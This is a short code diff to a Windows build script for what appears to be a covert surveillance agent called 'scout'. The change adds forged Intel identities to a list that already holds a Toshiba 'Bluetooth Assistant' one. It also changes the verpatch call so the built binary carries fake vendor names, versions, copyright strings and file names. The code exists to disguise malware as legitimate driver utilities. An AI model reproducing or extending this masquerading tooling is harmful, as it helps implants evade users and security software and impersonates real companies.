@@ -362,7 +362,9 @@ class BuildWindows < Build
   end
 
   def scout_name(seed)
-    scout_names = [{name: 'btassist', version: '7.0.0.0', desc: 'Bluetooth Assistant', company: 'TOSHIBA CORPORATION', copyright: 'Copyright (C) 2009 TOSHIBA CORPORATION, All rights reserved.'}]
+    scout_names = [{name: 'btassist', version: '7.0.0.0', desc: 'Bluetooth Assistant', company: 'TOSHIBA CORPORATION', copyright: 'Copyright (C) 2009 TOSHIBA CORPORATION, All rights reserved.'},
+                   {name: 'IAStorIcon', version: '10.1.0.1008', desc: 'IAStorIcon', company: 'INTEL CORPORATION', copyright: 'Copyright (c) Intel Corporation 2009-2010'},
+                   {name: 'PrivacyIconClient', version: '7.1.20.1119', desc: 'Intel(R) Management and Security Status', company: 'INTEL CORPORATION', copyright: 'Copyright (c) 2007-2011 Intel Corporation'}]
 
     scout_names[seed.ord % scout_names.size]
   end
@@ -374,7 +376,7 @@ class BuildWindows < Build
 
     CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon)}"
 
-    CrossPlatform.exec path('verpatch'), "/va #{path('scout')} \"#{info[:version]}\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
   end
 end
 
